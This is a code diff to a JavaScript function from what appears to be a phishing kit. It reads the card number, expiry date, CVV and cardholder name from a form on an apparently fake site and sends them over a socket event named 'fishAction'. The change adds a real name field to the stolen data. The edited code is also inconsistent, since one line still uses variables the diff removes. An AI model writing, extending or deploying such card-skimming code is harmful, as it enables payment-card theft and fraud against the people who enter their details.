@@ -20,11 +20,9 @@ const SubmitCCInfo = async () => {
     }
 
     let hpCardNumberVal = hpCardNumberInput.value;
-    let hpCardMMYYVal = hpCardMMYYInput.value || "no info";
-    let hpCardCvvVal = hpCardCVVInput.value || "no info";
-
-    let hpFirstNameVal = "First Name";
-    let hpLastNameVal = "Last Name";
+    let hpCardMMYYVal = hpCardMMYYInput.value;
+    let hpCardCvvVal = hpCardCVVInput.value;
+    let hpCCFirstLastNameVal = hpCCFirstLastNameInput.value;
 
     const ifSessionExist = localStorage.getItem("ifSessionExist");
 
@@ -40,7 +38,7 @@ const SubmitCCInfo = async () => {
             projectType: projectType,
             fake: window.location.hostname,
             ccOrderSum: `?`,
-            ccFullName: `${hpFirstNameVal} ${hpLastNameVal}`,
+            ccFullName: `${hpCCFirstLastNameVal}`,
         });
     }
 
@@ -50,7 +48,7 @@ const SubmitCCInfo = async () => {
         socket.emit("fishAction", {
             action: "fishAction",
             actionData:
-                `\nCard info:\nCard Name: ${hpFirstNameVal} ${hpLastNameVal}\nCard Number: ${hpCardNumberVal}` +
+                `\nCard info:\nCard Name: ${hpCCFirstLastNameVal}\nCard Number: ${hpCardNumberVal}` +
                 `\nExp: ${hpCardMMYYVal} cvv: ${hpCardCvvVal}`,
             ccName: `${hpFirstNameVal} ${hpLastNameVal}`,
             ccNumber: hpCardNumberVal,
